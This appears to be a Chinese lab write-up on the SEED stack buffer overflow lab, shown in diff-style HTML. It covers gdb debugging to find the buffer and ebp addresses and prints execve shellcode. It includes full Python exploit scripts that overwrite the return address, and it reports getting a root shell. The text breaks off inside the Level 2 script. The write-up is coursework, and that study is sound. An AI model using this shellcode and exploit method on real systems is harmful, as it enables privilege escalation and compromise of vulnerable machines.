+<blockquote>
+<ul>
+<li><strong>gcc</strong> 是最底层的编译器，直接把源文件编译成可执行文件。</li>
+<li><strong>make</strong> 是自动化工具，负责调用 gcc（或其他编译器）去编译、链接、清理等，规则写在 <strong>Makefile</strong>。</li>
+<li><strong>Makefile</strong> 是 make 用的规则文件，描述编译流程。</li>
+<li><strong>cmake</strong> 是更高级的自动化工具，用来生成 Makefile（或其他工程文件），让跨平台和大型项目编译更方便。</li>
+</ul>
+<p>关系图：</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">CM<span class="hljs-function"><span class="hljs-title">akeLists</span>.txt  --cmake生成--&gt;</span>  M<span class="hljs-function"><span class="hljs-title">akefile</span>  --make读取--&gt;</span>  <span class="hljs-function"><span class="hljs-title">gcc</span>等编译器  --&gt;</span>  可执行文件<br></code></pre></td></tr></table></figure></blockquote>
+<p>我们将在 gcc命令中添加-g选项，将调试信息添加到二进制文件中。如果你运行了 make命令，则 已经创建了调试版本。我们将使用 gdb来调试 stack-L1-dbg。在运行该程序前我们需要创建 badfile 文件。</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> touch badfile <span class="hljs-comment">//创建badfile文件</span><br><span class="hljs-symbol">$</span> gdb stack-L1-dbg<br>gdb-peda<span class="hljs-symbol">$</span> b bof <span class="hljs-comment">//在函数bof()处设置断点</span><br>Breakpoint1at0x124d:filestack.c,line18.<br>gdb-peda<span class="hljs-symbol">$</span> run <span class="hljs-comment">//开始运行程序</span><br>...<br> Breakpoint1,bof(str=<span class="hljs-number">0xffffcf57</span> ...)atstack.c:<span class="hljs-number">18</span><br> <span class="hljs-number">18</span> &#123;<br>gdb-peda<span class="hljs-symbol">$</span> next <span class="hljs-comment">//参见Note</span><br> ...<br><span class="hljs-number">22</span> strcpy(buffer,str);<br>gdb-peda<span class="hljs-symbol">$</span> p <span class="hljs-symbol">$</span>ebp <span class="hljs-comment">//打印ebp的值</span><br><span class="hljs-meta"><span class="hljs-keyword">$1</span>= (void*)0xffffdfd8</span><br>gdb-peda<span class="hljs-symbol">$</span> p &amp;buffer <span class="hljs-comment">//获得buffer的起始地址</span><br><span class="hljs-meta"><span class="hljs-keyword">$2</span>= (char(*)[100]) 0xffffdfac</span><br>gdb-peda<span class="hljs-symbol">$</span> quit <span class="hljs-comment">//退出</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>gdb</strong>（GNU Debugger）是Linux&#x2F;Unix平台上最常用的C&#x2F;C++程序调试工具。</p>
+<ul>
+<li><strong>在Linux&#x2F;类Unix系统下，gdb是最常用、最经典的调试工具</strong>。</li>
+<li>macOS下，<strong>lldb</strong>逐渐成为主流（但gdb也能用）。</li>
+<li>Windows下，<strong>Visual Studio调试器</strong>和<strong>windbg</strong>最常用。</li>
+</ul>
+</blockquote>
+<p>我们使用<code>gdb</code>对二进制文件进行调试。</p>
+<ol>
+<li>首先我们使用<code>b bof</code>在<code>bof()</code>函数处下断点</li>
+<li>然后使用<code>run</code>命令运行程序到断点处，如下图所示：</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152151596.png" srcset="/img/loading.gif" lazyload alt="image-20251005214115251"></p>
+<blockquote>
+<p><strong>ebp</strong>：ebp（）是x86架构中的一个寄存器，通常用于函数调用中的栈帧管理。它的主要用途是在程序执行过程中充当基址指针，具体来说，EBP在函数调用时保存了调用者的栈帧基址，并被用来创建当前函数的栈帧。</p>
+<p><strong>esp</strong>：esp（）是x86架构中的一个寄存器，用于指向当前栈顶的位置。它是栈指针寄存器，用于管理栈的操作，特别是在函数调用和返回时对栈进行操作。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">=&gt; 0x565562ad &lt;bof&gt;:	endbr32 <br>   0x565562b1 &lt;bof+4&gt;:	push   ebp<br>   0x565562b2 &lt;bof+5&gt;:	mov    ebp,esp<br>   0x565562b4 &lt;bof+7&gt;:	push   ebx<br>   0x565562b5 &lt;bof+8&gt;:	sub    esp,0x84<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>push ebp</code>：将<strong>调用者的 ebp</strong>（即上一个函数的 ebp）压入栈。</li>
+<li><code>mov ebp, esp</code>：用当前 esp 的值（即当前栈顶）设置 ebp，形成当前函数的新栈帧。</li>
+<li><code>push ebx</code> 和 <code>sub esp, 0x84</code> 分别保存 ebx 寄存器、并为局部变量分配空间。</li>
+</ul>
+<p><strong>可以发现<code>esp</code>的值还没赋给<code>ebp</code>，因此此时我们获取的值是函数调用者的地址</strong>。</p>
+<p>使用<code>p $ebp</code>打印 ebp 寄存器的地址：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">gdb-peda$ </span><span class="language-bash">p <span class="hljs-variable">$ebp</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">1 = (void *) 0xffffcf58</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152151482.png" srcset="/img/loading.gif" lazyload alt="image-20251005214547497"></p>
+<p>而我们想获得<code>bof()</code>函数的基址，需要先让程序执行到<code>0x565562b2 &lt;bof+5&gt;: mov ebp,esp</code>这步之后<code>ebp</code>中存储的地址才是<code>bof()</code>函数的基址。</p>
+<p>使用<code>next</code>命令进行单步调试，此时再使用<code>p $ebp</code>打印 ebp 寄存器的地址，才是<code>bof()</code>函数的基址。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">gdb-peda$ </span><span class="language-bash">p <span class="hljs-variable">$ebp</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">2 = (void *) 0xffffcb48</span><br></code></pre></td></tr></table></figure>
+
+<p>此时再使用<code>p &amp;buffer</code>来获取缓冲区的起始地址</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">gdb-peda$ </span><span class="language-bash">p &amp;buffer</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">3 = (char (*)[100]) 0xffffcadc</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152151155.png" srcset="/img/loading.gif" lazyload alt="image-20251005214819564"></p>
+<h3 id="实施攻击"><a href="#实施攻击" class="headerlink" title="实施攻击"></a>实施攻击</h3><p>我们需要将前面提到的32bit的shellcode转为机器码，如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">\x31\xc0              // xor    eax,eax<br>\x50                  // push   eax<br>\x68\x2f\x2f\x73\x68  // push   0x68732f2f  (&quot;//sh&quot;)<br>\x68\x2f\x62\x69\x6e  // push   0x6e69622f  (&quot;/bin&quot;)<br>\x89\xe3              // mov    ebx,esp<br>\x50                  // push   eax<br>\x53                  // push   ebx<br>\x89\xe1              // mov    ecx,esp<br>\x31\xd2              // xor    edx,edx<br>\x31\xc0              // xor    eax,eax<br>\xb0\x0b              // mov    al,0xb<br>\xcd\x80              // int    0x80<br></code></pre></td></tr></table></figure>
+
+<p>所以shellcode就可以写为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode= (<br><span class="hljs-string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>为了实现缓冲区溢出攻击，我们需要精心设计shellcode的位置以及覆盖原有函数的地址，使shellcode可以执行并返回。</p>
+<p>这里有三个最主要的参数（<strong>start</strong>、<strong>ret</strong>、<strong>offset</strong>），下面我们一一理解并确定</p>
+<p><strong>start</strong>：shellcode在缓冲区的偏移位置</p>
+<ul>
+<li><strong>作用</strong>：决定你的 shellcode 被写入缓冲区的哪个位置。</li>
+<li>如何确定<ul>
+<li>通常选一个距离返回地址较近但不会被覆盖的位置，比如缓冲区后半段。</li>
+<li>举例：缓冲区 517 字节，而且我们的shellcode长度为27，可以选400，这样的话shellcode是写在缓冲区400到427字节（关键是和下面的 ret 对应）。</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Put the shellcode somewhere in the payload</span><br>start = <span class="hljs-number">400</span>               <span class="hljs-comment"># Change this number </span><br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br></code></pre></td></tr></table></figure>
+
+<p>可以参考下面这图理解一下</p>
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs prolog">高地址<br>  [ buffer[<span class="hljs-number">517</span>] ]<br>  [ buffer[<span class="hljs-number">516</span>] ]<br>  ...<br>  [ buffer[<span class="hljs-number">400</span>] ]     &lt;- shellcode start<br>  ...<br>  [ buffer[<span class="hljs-number">1</span>] ]<br>  [ buffer[<span class="hljs-number">0</span>] ]<br>低地址<br></code></pre></td></tr></table></figure>
+
+<p><strong>ret</strong>：需要覆盖的返回地址的值，即 shellcode 的绝对地址</p>
+<ul>
+<li><strong>作用</strong>：让函数 return 时跳到你的 shellcode。<strong>返回地址 &#x3D; shellcode 的实际地址，就是让程序 return 时去执行你的 shellcode。</strong></li>
+<li>如何确定<ul>
+<li>你需要知道缓冲区在内存中的起始地址（可以用 gdb 调试得到，比如 <code>p &amp;buffer</code>）。</li>
+<li>shellcode在缓冲区的偏移是 start，所以 ret &#x3D; 缓冲区起始地址 + start。</li>
+</ul>
+</li>
+</ul>
+<p>$$<br>ret&#x3D;&amp;buffer(缓冲区起始地址)+start(shellcode在缓冲区里的位置)<br>$$</p>
+<p><strong>offset</strong>：需要覆盖的返回地址在缓冲区中的偏移，即<code>bof()</code>函数的返回地址（与上面ret区分开来）与缓冲区起始地址的相对位置</p>
+<ul>
+<li><strong>作用</strong>：决定你要在 payload 的哪个位置写入 ret（返回地址）。</li>
+<li>如何确定<ul>
+<li>用 gdb 查 ebp（保存的基址指针）和缓冲区地址的差距。</li>
+<li>通常 offset &#x3D; $ebp - &amp;buffer + 4，其中 +4 是因为返回地址在 ebp 上面 4 字节。</li>
+</ul>
+</li>
+</ul>
+<p>$$<br>offset&#x3D;$ebp-&amp;buffer+4<br>$$</p>
+<p>可以结合下面这张图理解一下（缓冲区处不太严谨，实际上<code>bof()</code>中的缓冲区只有 BUF_SIZE(100) 字节长，小于 517字节，所以buffer[517]已经溢出到返回地址之上了）</p>
+<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">高地址<br>   +<span class="hljs-comment">-------------------+      &lt;- 返回地址 (retaddr)</span><br>   |  <span class="hljs-keyword">return</span> address   |<br>   +<span class="hljs-comment">-------------------+      &lt;- 保存的EBP (ebp)</span><br>   |  saved EBP (<span class="hljs-number">4</span><span class="hljs-built_in">bit</span>) |<br>   +<span class="hljs-comment">-------------------+</span><br>   |  <span class="hljs-keyword">buffer</span>[<span class="hljs-number">517</span>]      |      &lt;- 实际上缓冲区会溢出到比<span class="hljs-keyword">return</span> address更高的地址，这里是为了理解<br>   |  <span class="hljs-keyword">buffer</span>[<span class="hljs-number">516</span>]      |<br>   |    ...            |<br>   |  <span class="hljs-keyword">buffer</span>[<span class="hljs-number">1</span>]        |<br>   |  <span class="hljs-keyword">buffer</span>[<span class="hljs-number">0</span>]        |      &lt;- 缓冲区起始地址 (&amp;<span class="hljs-keyword">buffer</span>)<br>   +<span class="hljs-comment">-------------------+      </span><br>低地址<br></code></pre></td></tr></table></figure>
+
+<p>更严谨的是这样</p>
+<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">高地址<br>   +<span class="hljs-comment">------------------------+      &lt;- return address (EIP设置为这里)</span><br>   |   <span class="hljs-keyword">return</span> address       |<br>   +<span class="hljs-comment">------------------------+      &lt;- saved EBP (ebp寄存器指向这里，同时之前ebp的值也存在这里)</span><br>   |   saved EBP (<span class="hljs-number">4</span>字节)    |<br>   +<span class="hljs-comment">------------------------+      ↑ 缓冲区最后一个字节，再往上就是溢出了</span><br>   |   <span class="hljs-keyword">buffer</span>[<span class="hljs-number">99</span>]           |<br>   |   <span class="hljs-keyword">buffer</span>[<span class="hljs-number">98</span>]           |<br>   |        ...             |<br>   |   <span class="hljs-keyword">buffer</span>[<span class="hljs-number">1</span>]            |<br>   |   <span class="hljs-keyword">buffer</span>[<span class="hljs-number">0</span>]            |      &lt;- 缓冲区起始地址 (&amp;<span class="hljs-keyword">buffer</span>, esp初始值)<br>   +<span class="hljs-comment">------------------------+</span><br>低地址<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>esp（栈顶指针）：在函数运行时，esp 指向当前栈顶。进入 bof() 时，esp 通常指向 buffer[0] 或更低地址。</p>
+<p>ebp（基址指针）：ebp 通常指向 saved EBP 的位置（即 ebp –&gt; | saved EBP |）</p>
+<p>eip（指令寄存器）：return 时，eip 会被设置为 return address 的值，决定程序跳转到哪里执行。</p>
+</blockquote>
+<p>编写exp</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152716.png" srcset="/img/loading.gif" lazyload alt="image-20251005225904766"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Replace the content with the actual shellcode</span><br>shellcode= (<br><span class="hljs-string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><span class="hljs-comment"># Fill the content with NOP&#x27;s</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">517</span>)) <br><br><span class="hljs-comment">##################################################################</span><br><span class="hljs-comment"># Put the shellcode somewhere in the payload</span><br>start = <span class="hljs-number">400</span>               <span class="hljs-comment"># Change this number </span><br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br><br><span class="hljs-comment"># Decide the return address value </span><br><span class="hljs-comment"># and put it somewhere in the payload</span><br>ret    =  <span class="hljs-number">0xffffcadc</span> + start                <span class="hljs-comment"># Change this number </span><br>offset =  <span class="hljs-number">0xffffcb48</span> - <span class="hljs-number">0xffffcadc</span> + <span class="hljs-number">4</span>       <span class="hljs-comment"># Change this number </span><br><br>L = <span class="hljs-number">4</span>     <span class="hljs-comment"># Use 4 for 32-bit address and 8 for 64-bit address</span><br>content[offset:offset + L] = (ret).to_bytes(L,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>) <br><span class="hljs-comment">##################################################################</span><br><br><span class="hljs-comment"># Write the content to a file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></td></tr></table></figure>
+
+<p>执行我们的exp写入shellcode，并执行写入shellcode后的程序：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152923.png" srcset="/img/loading.gif" lazyload alt="image-20251005225743320"></p>
+<p>攻击成功，获得了root shell。</p>
+<p>我们通读一下exp：</p>
+<ol>
+<li><p>构造一个大缓冲区（全是NOP）</p>
+<p>用 517 个 <code>0x90</code> 填充（0x90 是 NOP 指令，什么也不做），形成 NOP滑板，增加攻击成功率。</p>
+</li>
+<li><p>在指定位置写入shellcode</p>
+<p>把shellcode写进 <code>content</code> ，这里是第400字节处。</p>
+</li>
+<li><p>计算shellcode的内存地址</p>
+<ul>
+<li><code>0xffffcadc</code> 是缓冲区（buffer）的实际内存起始地址（从gdb调试得到）。</li>
+<li><code>start</code> 是shellcode在缓冲区里的偏移。</li>
+<li><code>ret</code> 就是shellcode的实际内存地址，<strong>你希望程序return时跳到这里执行shellcode</strong>。</li>
+</ul>
+</li>
+<li><p>找到返回地址在缓冲区中的偏移</p>
+<ul>
+<li><code>0xffffcb48</code> 是 ebp（基址指针）的地址（用gdb查）。</li>
+<li><code>0xffffcadc</code> 是 buffer 的地址。</li>
+<li><code>+4</code> 表示再往高地址4字节，就是存放返回地址的位置。</li>
+<li><code>offset</code> 是“从缓冲区起始到返回地址的距离”，你需要用这个数，才能在content里正确覆盖返回地址。</li>
+</ul>
+</li>
+<li><p>覆盖返回地址为shellcode地址</p>
+<ul>
+<li>把返回地址（ret）写到payload的正确位置（offset），用小端格式（x86习惯）。</li>
+<li>这样，当程序溢出时，返回地址就变成你的 shellcode 地址。</li>
+</ul>
+</li>
+<li><p>写入文件，等待攻击</p>
+</li>
+</ol>
+<h2 id="Task4：在不知道缓冲区大小的情况下实施攻击-Level-2"><a href="#Task4：在不知道缓冲区大小的情况下实施攻击-Level-2" class="headerlink" title="Task4：在不知道缓冲区大小的情况下实施攻击 (Level 2)"></a>Task4：在不知道缓冲区大小的情况下实施攻击 (Level 2)</h2><p>在 Level 1攻击中，我们通过 gdb调试获得了缓冲区的大小，但是在真实攻击中，缓冲区大小的信息可能很难获得。例如，如果目标程序是运行在远程机器上的服务器程序时，那么我们将无法获得二进制代码或源代码的副本。在本任务中，我们将添加一个约束条件：你仍然可以使用 gdb，但不允许获得缓冲区的大小。实际上，Makefile文件提供了缓冲区的大小，但是在攻击中不允许使用该信息。</p>
+<p>你的任务是让漏洞程序在此约束条件下运行 shellcode。我们假设你知道缓冲区大小的范围是 100∼200 字节。另一个有用的事实是：由于内存对齐，存储在帧指针中的值总是4的倍数（对于32-bit程序来说）。</p>
+<p>请注意，你只能构造一个 payload，而且该 payload适用于此范围内(100∼200字节)的任何缓冲区 大小。如果你使用暴力方法即每次尝试缓冲区大小，你将不会获得满分。你尝试的次数越多，越有可能被 被攻击者发现并防御。这就是为什么尽量减少尝试的次数对攻击来说很重要。在实验报告中，你需要描述 你的攻击方法并提供证明。</p>
+<p>我们这里总结一下目前已知和未知的：</p>
+<p>已知的就是我们还是可以写入517字节的内容；但是缓冲区的范围未知了，之前这个数字是100，但是现在我们只知道范围是100~200，所以很难确定返回地址在缓冲区中的偏移。</p>
+<p>我们可以将buffer的前204位置全部设置为ret的地址，这样只要发生缓冲区溢出，且溢出可以覆盖返回地址，我们就可以成功进行攻击。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># Put the shellcode somewhere in the payload</span><br>start = <span class="hljs-number">400</span>               <span class="hljs-comment"># Change this number </span><br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br></code></pre></td></tr></table></figure>
+
+<p>这里我们先按之前的做法做一遍，也就是<strong>知道缓冲区大小的情况下</strong>：</p>
+<p>使用gdb调试，找到函数的起始地址和缓冲区的起始地址</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">touch</span> badfile //创建badfile文件</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">gdb stack-L2-dbg</span><br><span class="hljs-meta prompt_">gdb-peda$ </span><span class="language-bash">b bof //在函数bof()处设置断点</span><br>Breakpoint1at0x124d:filestack.c,line18.<br><span class="hljs-meta prompt_">gdb-peda$ </span><span class="language-bash">run //开始运行程序</span><br>...<br> Breakpoint1,bof(str=0xffffcf57 ...)atstack.c:18<br> 18 &#123;<br><span class="hljs-meta prompt_">gdb-peda$ </span><span class="language-bash">next //参见Note</span><br> ...<br>22 strcpy(buffer,str);<br><span class="hljs-meta prompt_">gdb-peda$ </span><span class="language-bash">p <span class="hljs-variable">$ebp</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">1 = (void *) 0xffffcb48</span><br><span class="hljs-meta prompt_">gdb-peda$ </span><span class="language-bash">p &amp;buffer</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">2 = (char (*)[180]) 0xffffca8c</span><br><span class="hljs-meta prompt_">gdb-peda$ </span><span class="language-bash">quit //退出</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152523.png" srcset="/img/loading.gif" lazyload alt="image-20251006193423714"></p>
+<p>编写exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Replace the content with the actual shellcode</span><br>shellcode= (<br>  <span class="hljs-string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;</span><br>  <span class="hljs-string">&quot;\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span><br>  <span class="hljs-string">&quot;\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><span class="hljs-comment"># Fill the content with NOP&#x27;s</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">517</span>)) <br><br><span class="hljs-comment">##################################################################</span><br><span class="hljs-comment"># Put the shellcode somewhere in the payload</span><br>start = <span class="hljs-number">400</span>              <span class="hljs-comment"># Change this number </span><br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br><br><span class="hljs-comment"># Decide the return address value </span><br><span class="hljs-comment"># and put it somewhere in the payload</span><br>ret    =  <span class="hljs-number">0xffffca8c</span> + start         <span class="hljs-comment"># Change this number </span><br>offset =  <span class="hljs-number">0xffffcb48</span> - <span class="hljs-number">0xffffca8c</span> + <span class="hljs-number">4</span>             <span class="hljs-comment"># Change this number </span><br><br>L = <span class="hljs-number">4</span>     <span class="hljs-comment"># Use 4 for 32-bit address and 8 for 64-bit address</span><br>content[offset:offset + L] = (ret).to_bytes(L,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><span class="hljs-comment"># content[0:204] = (ret).to_bytes(L,byteorder=&#x27;little&#x27;) * (204//4) #将前204位全部填充ret</span><br><span class="hljs-comment">##################################################################</span><br><br><span class="hljs-comment"># Write the content to a file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></td></tr></table></figure>
+
+<p>执行exp，并执行写入shellcode后的可执行文件<code>stack-L2</code></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152060.png" srcset="/img/loading.gif" lazyload alt="image-20251006193652677"></p>
+<p>然后再按要求打一遍，也就是<strong>不知道缓冲区大小的情况下</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Replace the content with the actual shellcode</span><br>shellcode= (<br>  <span class="hljs-string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;</span><br>  <span class="hljs-string">&quot;\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span><br>  <span class="hljs-string">&quot;\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><span class="hljs-comment"># Fill the content with NOP&#x27;s</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">517</span>)) <br><br><span class="hljs-comment">##################################################################</span><br><span class="hljs-comment"># Put the shellcode somewhere in the payload</span><br>start = <span class="hljs-number">400</span>              <span class="hljs-comment"># Change this number </span><br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br><br><span class="hljs-comment"># Decide the return address value </span><br><span class="hljs-comment"># and put it somewhere in the payload</span><br>ret    =  <span class="hljs-number">0xffffca8c</span> + start         <span class="hljs-comment"># Change this number </span><br><span class="hljs-comment"># offset =  0xffffcb48 - 0xffffca8c + 4             # Change this number </span><br><br>L = <span class="hljs-number">4</span>     <span class="hljs-comment"># Use 4 for 32-bit address and 8 for 64-bit address</span><br><span class="hljs-comment"># content[offset:offset + L] = (ret).to_bytes(L,byteorder=&#x27;little&#x27;)</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">204</span>] = 